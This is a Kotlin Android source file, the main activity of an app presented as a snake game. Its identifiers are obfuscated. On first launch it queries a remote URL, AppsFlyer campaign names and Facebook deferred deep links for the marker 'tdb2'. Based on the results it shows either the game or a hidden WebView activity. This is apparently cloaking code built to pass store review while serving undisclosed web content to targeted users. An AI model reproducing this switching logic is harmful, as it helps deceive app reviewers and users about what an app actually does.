package com.snake.io.slither

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.snake.io.slither.AplClasssssssss.Companion.ApppsFfffff_DEV_KEY
import com.snake.io.slither.AplClasssssssss.Companion.NAMING
import com.snake.io.slither.AplClasssssssss.Companion.CHHH
import com.snake.io.slither.AplClasssssssss.Companion.DIPING
import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheck11111111
import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheck22222222
import com.snake.io.slither.databinding.ActivityMainBinding
import com.snake.io.slither.gamerrrrr.GameHolderActivity
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var mainBinding: ActivityMainBinding

    var checker_it_vill_change: String = "null"
    lateinit var jsoooooup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mainBinding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(mainBinding.root)
        jsoooooup = ""
        deeeeeeeeeeeeeeeP(this)

        val yyyyprefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (yyyyprefs.getBoolean("activity_exec", false)) {


            val sharPrefAgain = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPrefAgain.getString(CHHH, "null")) {
                "2" -> {
                    skipMePleasee()
                }
                "3" -> {
                    restdyui()
                }
                "4" -> {
                    testWebbbbVievv()
                }
                "nm" -> {
                    testWebbbbVievv()
                }
                "dp" -> {
                    testWebbbbVievv()
                }
                "org" -> {
                    skipMePleasee()
                }
                else -> {
                    skipMePleasee()
                }
            }

        } else {
            val gtyhhuu = yyyyprefs.edit()
            gtyhhuu.putBoolean("activity_exec", true)
            gtyhhuu.apply()

            val jobaaaa = GlobalScope.launch(Dispatchers.IO) {
                checker_it_vill_change = retdrft(linkAppsCheck11111111 + linkAppsCheck22222222)
            }
            runBlocking {
                try {
                    jobaaaa.join()
                } catch (_: Exception) {
                }
            }

            when (checker_it_vill_change) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(ApppsFfffff_DEV_KEY, frgyhuju, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    fegrhty(1500)
                }
                "2" -> {
                    skipMePleasee()
                }
                "3" -> {
                    AppsFlyerLib.getInstance()
                        .init(ApppsFfffff_DEV_KEY, frgyhuju, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    rdtfygh(1500)
                }
                "4" -> {
                    testWebbbbVievv()
                }

            }
        }
    }


    private fun fegrhty(timeInterval: Long): Job {

        val fuckingSharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk11111: String? = fuckingSharPref.getString(NAMING, null)
                val hawkdeeeeeepy: String? = fuckingSharPref.getString(DIPING, "null")
                if (hawk11111 != null) {
                    if (hawk11111.contains("tdb2")) {
                        val editorEditor = fuckingSharPref.edit()
                        editorEditor.putString(CHHH, "nm")
                        editorEditor.apply()
                        testWebbbbVievv()
                    } else if (hawkdeeeeeepy != null) {
                        if (hawkdeeeeeepy.contains("tdb2")) {
                            testWebbbbVievv()
                        } else {
                            val ediEdiEdieditor = fuckingSharPref.edit()
                            ediEdiEdieditor.putString(CHHH, "org")
                            ediEdiEdieditor.apply()
                            skipMePleasee()
                        }
                    }
                    break
                } else {
                    val hawkyyyyy1: String? = fuckingSharPref.getString(NAMING, null)
                    delay(timeInterval)
                }
            }
        }
    }

    private fun restdyui() {
        Intent(this, CanIFilterYouActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    private suspend fun retdrft(link: String): String {
        val url = URL(link)
        val oooooneStr = "1"
        val tttttwoStr = "2"
        val tttttestStr = "3"
        val fffffourStr = "4"
        val aaaaactiveStrn = "0"
        val urlConnectionDis = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = urlConnectionDis.inputStream.bufferedReader().readText()) {

                "1" -> {
                    oooooneStr
                }
                "2" -> {
                    val ftgyhyhy = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val getrjk = ftgyhyhy.edit()
                    getrjk.putString(CHHH, tttttwoStr)
                    getrjk.apply()
                    tttttwoStr
                }
                "3" -> {
                    val fgrhtj = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val afegrhtjk = fgrhtj.edit()
                    afegrhtjk.putString(CHHH, tttttestStr)
                    afegrhtjk.apply()
                    tttttestStr
                }
                "4" -> {
                    val dfegrhtjyk = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val erdtfhygj = dfegrhtjyk.edit()
                    erdtfhygj.putString(CHHH, fffffourStr)
                    erdtfhygj.apply()
                    fffffourStr
                }
                else -> {
                    aaaaactiveStrn
                }
            }
        } finally {
            urlConnectionDis.disconnect()
        }

    }


    private fun rdtfygh(timeInterval: Long): Job {
        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1dfghj: String? = sharPref.getString(NAMING, null)
                if (hawk1dfghj != null) {
                    restdyui()
                    break
                } else {
                    val hawk1: String? = sharPref.getString(NAMING, null)
                    delay(timeInterval)
                }
            }
        }
    }

    val frgyhuju = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPreffsgdh = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editorsdrftg = sharPreffsgdh.edit()
            val dataGottendrgfhgj = data?.get("campaign").toString()
            editorsdrftg.putString(NAMING, dataGottendrgfhgj)
            editorsdrftg.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }



    fun deeeeeeeeeeeeeeeP(context: Context) {
        val sharPreffrgthyu = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editordefsrgty = sharPreffrgthyu.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val paramsssssss = appLinkData.targetUri.host
                //тест
                editordefsrgty.putString(DIPING, paramsssssss.toString())
                editordefsrgty.apply()
                if (paramsssssss!!.contains("tdb2")) {
                    editordefsrgty.putString(CHHH, "dp")
                    editordefsrgty.apply()
                }

            }
            if (appLinkData == null) {

            }

        }
    }

    private fun testWebbbbVievv() {
        Intent(this, WeeeeebStartActivity::class.java)
            .also { startActivity(it) }
        finish()
    }



    private fun skipMePleasee() {
        Intent(this, GameHolderActivity::class.java)
            .also { startActivity(it) }
        finish()
    }


}